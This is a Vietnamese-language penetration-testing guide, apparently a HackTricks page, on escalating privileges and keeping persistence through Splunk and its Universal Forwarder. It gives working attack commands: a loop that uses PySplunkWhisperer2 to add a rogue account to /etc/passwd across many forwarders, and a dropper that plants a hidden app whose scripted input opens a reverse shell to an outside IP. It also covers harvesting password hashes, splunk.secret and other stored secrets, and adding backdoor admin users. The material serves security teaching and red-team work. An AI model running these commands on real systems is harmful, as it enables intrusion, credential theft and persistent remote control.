# Splunk LPE và Persistence

{{#include ../../banners/hacktricks-training.md}}

Nếu **enumerating** một máy **nội bộ** hoặc **bên ngoài** và phát hiện **Splunk đang chạy** (thường dùng cổng **8000** cho giao diện web và **8089** cho management API), thông tin đăng nhập hợp lệ thường có thể dẫn đến **code execution** thông qua cài đặt app, scripted inputs hoặc các thao tác quản lý.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Nếu Splunk chạy với quyền **root**, điều này thường dẫn đến **privilege escalation** ngay lập tức.<sup>[[1]](#references)</sup>

Nếu bạn chỉ cần tìm hiểu về bề mặt tấn công từ xa nói chung, enumeration hoặc đường dẫn RCE qua tải lên app, hãy xem:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Nếu bạn **đã có quyền root** và dịch vụ Splunk không chỉ lắng nghe trên localhost, bạn cũng có thể đánh cắp **Splunk password hashes**, khôi phục **encrypted secrets** hoặc đẩy một **malicious app** để duy trì persistence trên máy cục bộ hoặc trên nhiều forwarder.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Các tệp cục bộ đáng chú ý

Khi truy cập được một máy chủ đang chạy Splunk hoặc Splunk Universal Forwarder, các đường dẫn sau thường đáng chú ý nhất:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```

Các hiện vật quan trọng:

- **`$SPLUNK_HOME/etc/passwd`**: người dùng Splunk cục bộ và các hash mật khẩu.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: khóa Splunk dùng để mã hóa các secret được lưu trong một số tệp `.conf`.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: tệp khởi tạo admin ban đầu; hữu ích trong các gold image và khi có sai sót trong quá trình provisioning. Tệp này bị bỏ qua nếu `etc/passwd` đã tồn tại.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: nơi thường bật các scripted input.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** hoặc **`$SPLUNK_HOME/etc/apps/`**: vị trí phù hợp để ẩn một app duy trì quyền truy cập hoặc kiểm tra những gì hiện đang được phân phối.<sup>[[11]](#references)</sup>

## Tóm tắt khai thác Splunk Universal Forwarder Agent

Để biết thêm chi tiết, xem [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Đây chỉ là bản tóm tắt.<sup>[[1]](#references)</sup>

**Tổng quan về exploit:**
Một exploit nhắm vào Splunk Universal Forwarder (UF) cho phép kẻ tấn công có **mật khẩu agent** thực thi mã tùy ý trên các hệ thống chạy agent, qua đó có khả năng xâm phạm phần lớn môi trường.<sup>[[1]](#references)</sup>

**Vì sao exploit hoạt động:**

- Dịch vụ quản lý UF thường được mở trên **TCP 8089**.<sup>[[6]](#references)</sup>
- Kẻ tấn công có thể xác thực với API và yêu cầu forwarder cài đặt một **gói app độc hại**.<sup>[[1]](#references)[[5]](#references)</sup>
- Cùng một primitive có thể được sử dụng cục bộ để thực hiện **LPE** hoặc từ xa để thực hiện **RCE**.<sup>[[5]](#references)</sup>
- Các công cụ công khai như **SplunkWhisperer2** tự động tạo gói app và có thể điều chỉnh payload cho mục tiêu Linux.<sup>[[5]](#references)</sup>

**Các cách phổ biến để lấy lại mật khẩu:**

- Thông tin xác thực dạng cleartext trong tài liệu, script, thư mục chia sẻ hoặc quy trình tự động hóa triển khai.<sup>[[1]](#references)</sup>
- Hash mật khẩu trong `$SPLUNK_HOME/etc/passwd`, sau đó crack offline.<sup>[[1]](#references)[[7]](#references)</sup>
- Gold image hoặc tệp còn sót lại từ quá trình provisioning, chẳng hạn như `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Tác động:**

- Thực thi mã với quyền SYSTEM/root trên mỗi máy chủ bị xâm phạm.<sup>[[1]](#references)</sup>
- Triển khai app duy trì quyền truy cập, backdoor hoặc ransomware.<sup>[[1]](#references)</sup>
- Vô hiệu hóa hoặc can thiệp vào telemetry trước khi dữ liệu được chuyển tiếp.<sup>[[1]](#references)</sup>

**Lệnh ví dụ để khai thác:**

Báo cáo gốc minh họa vòng lặp sau để gửi payload đến nhiều forwarder.<sup>[[1]](#references)</sup>

```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```

**Các public exploit có thể sử dụng:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence qua Scripted Inputs hoặc Malicious Apps

Nếu bạn có **quyền ghi vào filesystem** với tư cách `root`/`splunk`, hoặc có quyền truy cập đã xác thực để cài đặt app, một cơ chế persistence rất đáng tin cậy là đưa vào một **custom app** có **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Tài liệu chính thức của Splunk yêu cầu scripted input nằm trong thư mục app và được bật từ `inputs.conf`.<sup>[[10]](#references)</sup>

Bố cục thường gặp:

```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```

`inputs.conf` tối giản:<sup>[[10]](#references)</sup>

```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```

Dropper Linux nhanh (sử dụng bố cục ứng dụng đã được tài liệu hóa):<sup>[[10]](#references)</sup>

```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```

Ghi chú:

- Cùng thủ thuật này cũng áp dụng được với **Universal Forwarder** bằng cách dùng `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Kẻ tấn công thường hòa lẫn vào hệ thống bằng cách sửa đổi một add-on hợp pháp thay vì tạo một app độc hại dễ bị phát hiện.<sup>[[2]](#references)</sup>
- Trên **deployment server**, đặt một app độc hại bên trong `deployment-apps/` sẽ tạo thành **persistence trên toàn bộ fleet**, vì các forwarder định kỳ kiểm tra, tải xuống app đã cập nhật và thường khởi động lại để áp dụng chúng.<sup>[[11]](#references)[[12]](#references)</sup>

## Đánh cắp thông tin xác thực và chiếm quyền admin

Nếu có thể đọc các tệp cục bộ của Splunk, thường có hai mục tiêu hữu ích: khôi phục **quyền truy cập admin của Splunk** và khôi phục **thông tin xác thực dịch vụ đã mã hóa**.<sup>[[8]](#references)</sup>

### Hash mật khẩu và người dùng cục bộ

Splunk lưu dữ liệu xác thực cục bộ trong `etc/passwd`. Tùy vào cấu hình triển khai, việc crack tệp này có thể khôi phục thông tin xác thực còn hoạt động cho web UI và management API.<sup>[[1]](#references)[[7]](#references)</sup>

Nếu đã có thông tin xác thực **admin** hợp lệ và Splunk sử dụng backend xác thực **native**, có thể dùng chính CLI để thiết lập persistence.<sup>[[13]](#references)</sup>

```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```

### `splunk.secret` và các giá trị được mã hóa

Splunk dùng `etc/auth/splunk.secret` để bảo vệ các giá trị nhạy cảm được lưu trong nhiều tệp cấu hình. Nếu lấy được cả **secret** lẫn các tệp **`.conf`** liên quan, bạn thường có thể khôi phục hoặc phát lại:<sup>[[8]](#references)</sup>

- shared secret của forwarder/indexer như `pass4SymmKey`
- mật khẩu private key TLS như `sslPassword`
- thông tin xác thực bind LDAP như `bindDNPassword`

Điều này có thể hỗ trợ **lateral movement** ngay cả khi không thể crack mật khẩu admin của Splunk.<sup>[[8]](#references)</sup>

### Lạm dụng `user-seed.conf`

`user-seed.conf` chỉ được sử dụng trong lần khởi động đầu tiên hoặc khi `etc/passwd` không tồn tại. Vì vậy, tệp này ít hữu ích trên hệ thống đang hoạt động, nhưng rất đáng chú ý trong các trường hợp:<sup>[[9]](#references)</sup>

- template cài đặt đã bị xâm nhập
- container image
- quy trình cấp phát tự động không cần giám sát
- thiết bị tự động khởi tạo lại Splunk

Trong những trường hợp đó, cài một `HASHED_PASSWORD` được tạo bằng `splunk hash-passwd` là cách kín đáo để lấy lại quyền admin sau khi triển khai lại.<sup>[[9]](#references)</sup>

## Lạm dụng truy vấn Splunk

Để biết thêm chi tiết, xem [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Một kỹ thuật gần đây hữu ích là lạm dụng **XSLT do người dùng cung cấp** trong các phiên bản Splunk Enterprise dễ bị tấn công để biến tài khoản đã xác thực có ít quyền thành khả năng **thực thi lệnh OS** với tư cách người dùng `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

Quy trình tổng quát:<sup>[[3]](#references)[[4]](#references)</sup>

1. Xác thực vào Splunk.
2. Tải lên tệp **XSL** độc hại thông qua chức năng xem trước/tải lên.
3. Khiến Splunk render kết quả tìm kiếm bằng stylesheet đã tải lên từ thư mục **dispatch**.
4. Dùng payload XSLT để ghi tệp hoặc kích hoạt thực thi thông qua search pipeline của Splunk (ví dụ: truy cập chức năng nội bộ như `runshellscript`).

Điểm quan trọng đối với tấn công là hướng này cho phép **RCE sau xác thực mà không cần tải app lên**. Trên Linux, quyền truy cập thường là tài khoản **`splunk`**; tài khoản này vẫn có giá trị vì thường sở hữu cây thư mục ứng dụng, có thể đọc secrets và cài app duy trì quyền truy cập ngay cả khi mất shell.<sup>[[3]](#references)[[4]](#references)</sup>

Một đường dẫn tiêu biểu được dùng khi khai thác là:<sup>[[4]](#references)</sup>

```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```

Nếu Splunk chạy với quá nhiều quyền, hoặc người dùng `splunk` có quyền truy cập vào các script nguy hiểm, service unit có thể ghi hoặc các quy tắc `sudo` không an toàn, thì đây sẽ trở thành một chuỗi **LPE** gọn gàng.

## References

- [1] [Lạm dụng Splunk Forwarder để thực thi mã từ xa và duy trì quyền truy cập](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Cảnh giác với TraitorWare: Dùng Splunk để duy trì quyền truy cập](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Thông báo bảo mật Splunk SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Phân tích CVE-2023-46214: XSLT Injection RCE trong Splunk](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Thay đổi giá trị mặc định](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Triển khai mật khẩu an toàn trên nhiều máy chủ](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Thiết lập scripted input](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Tạo ứng dụng triển khai](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Cách thức cập nhật triển khai diễn ra](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Cấu hình người dùng bằng CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
